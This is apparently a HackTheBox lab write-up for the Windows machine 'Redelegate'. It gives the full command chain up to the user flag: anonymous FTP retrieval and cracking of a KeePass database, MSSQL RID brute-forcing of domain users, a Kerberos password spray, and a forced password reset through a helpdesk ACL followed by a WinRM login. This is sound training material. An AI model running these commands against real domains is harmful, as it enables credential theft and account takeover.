---
title: "Redelegate"
date: 2027-01-04 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, hard, active-directory, ftp, keepass, mssql, password-spray, acl-abuse, force-change-password]
image:
    path: /assets/Images/Redelegate-avatar.png
    alt: Redelegate
description: "Anonymous FTP leaks a KeePass database whose master password follows the company's own banned Season+Year pattern; the recovered SQLGuest login enumerates every domain user through MSSQL SUSER_SNAME RID brute-forcing, a password spray reuses the cracked password as Marie.Curie, and her HelpDesk ForceChangePassword right over Helen.Frost grants a WinRM session on the Domain Controller and the user flag."
---

## Overview

Redelegate is a hard-difficulty Windows Active Directory machine (Domain Controller for `redelegate.vl`). The path to user is a pure AD chain: anonymous FTP hands over a KeePass database, the database hands over a low-privilege SQL login, that login leaks the whole domain user list, a password spray lands a real account, and an over-broad helpdesk ACL resets another user's password into a WinRM session on the DC. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 254.6,116.0 150.0,150.0 124.1,185.6 129.1,143.2" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Highly realistic pure-AD chain (anonymous FTP KeePass, MSSQL SUSER_SNAME RID brute, password spray, HelpDesk ForceChangePassword ACL abuse) driven by enumeration and real misconfigs with no CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | Microsoft ftpd — anonymous allowed |
| 53 | DNS | AD domain `redelegate.vl` |
| 80 | HTTP | IIS 10.0 |
| 88 / 464 | Kerberos | DC |
| 135 / 139 / 445 | RPC / SMB | |
| 389 / 636 / 3268 / 3269 | LDAP / GC | `redelegate.vl` |
| 1433 | MSSQL | SQL Server 2019 (slow to start after spawn) |
| 3389 | RDP | |
| 5985 | WinRM | |

FTP with anonymous access on a Domain Controller is the obvious first stop.

```bash
nmap -Pn -p- --min-rate=2000 10.129.234.50
nmap -Pn -sC -sV -p21,53,80,88,135,139,389,445,464,636,1433,3268,3389,5985 10.129.234.50
```

## Enumeration

### Anonymous FTP

Anonymous login exposes three files: a KeePass database and two documents about an internal security audit and awareness training.

```bash
curl -s "ftp://anonymous:anonymous@10.129.234.50/Shared.kdbx" -o Shared.kdbx
curl -s "ftp://anonymous:anonymous@10.129.234.50/CyberAudit.txt" -o CyberAudit.txt
curl -s "ftp://anonymous:anonymous@10.129.234.50/TrainingAgenda.txt" -o TrainingAgenda.txt
```

The training agenda literally warns staff that `"SeasonYear!"` is a bad password — which is a strong hint about the KeePass master password format.

### Crack the KeePass database

Build a tiny wordlist of season + year + `!` and crack the master password.

```bash
keepass2john Shared.kdbx > shared.hash
printf '%s\n' Spring2024! Summer2024! Autumn2024! Fall2024! Winter2024! > seasons.txt
john --wordlist=seasons.txt shared.hash      # -> Fall2024!
```

Opening the database, the domain-user entries don't work, but the **SQLGuest** entry is a valid local MSSQL login.

```bash
python3 -c "from pykeepass import PyKeePass; [print(e.title, e.username, e.password) for e in PyKeePass('Shared.kdbx', password='Fall2024!').entries]"
```

### Enumerate domain users through MSSQL

A low-privilege SQL login on a domain-joined server can still translate SIDs to names. Grab the domain SID from a known account, then brute-force RIDs with `SUSER_SNAME` — no domain credentials needed.

```bash
# domain SID (last 4 bytes of Administrator's SID = RID 500)
printf "SELECT master.dbo.fn_varbintohexstr(SUSER_SID('REDELEGATE\\Administrator'));\nexit\n" \
  | impacket-mssqlclient SQLGuest:'<redacted>'@10.129.234.50 -port 1433

# RID brute the user list
python3 -c "p='010500000000000515000000a185deefb22433798d8e847a';[print('SELECT SUSER_SNAME(0x%s%s);'%(p,r.to_bytes(4,'little').hex())) for r in list(range(500,560))+list(range(1000,1200))];print('exit')" \
  | impacket-mssqlclient SQLGuest:'<redacted>'@10.129.234.50 -port 1433 | grep -iE 'REDELEGATE\\' | sort -u
```

This yields real users including `Marie.Curie`, `Helen.Frost`, `Ryan.Cooper`, and others.

## Foothold

### Password spray

Reuse the cracked password against the enumerated users via Kerberos pre-auth (a saved TGT means valid credentials).

```bash
for u in $(cat users.txt); do
  impacket-getTGT redelegate.vl/$u:'Fall2024!' -dc-ip 10.129.234.50 2>&1 | grep -q 'Saving ticket' && echo "[+] $u"
done
# -> Marie.Curie:Fall2024!
```

### Abuse the HelpDesk ACL

`Marie.Curie` is in the HelpDesk group, which holds a `ForceChangePassword` right over `Helen.Frost`. Request Marie's TGT, then reset Helen's password — no knowledge of the old one required.

```bash
impacket-getTGT redelegate.vl/Marie.Curie:'Fall2024!' -dc-ip 10.129.234.50
export KRB5CCNAME=Marie.Curie.ccache
bloodyAD -d redelegate.vl -k --host dc.redelegate.vl --dc-ip 10.129.234.50 set password 'Helen.Frost' '<redacted>'
```

`Helen.Frost` is allowed to use WinRM on the Domain Controller.

```bash
evil-winrm -i 10.129.234.50 -u Helen.Frost -p '<redacted>'
```

## User flag

```bash
cat C:\Users\Helen.Frost\Desktop\user.txt   # HTB{...}
```

Access as `redelegate\helen.frost` on the Domain Controller achieved — flag captured live (value redacted).

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Redelegate-avatar.png" alt="Redelegate" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
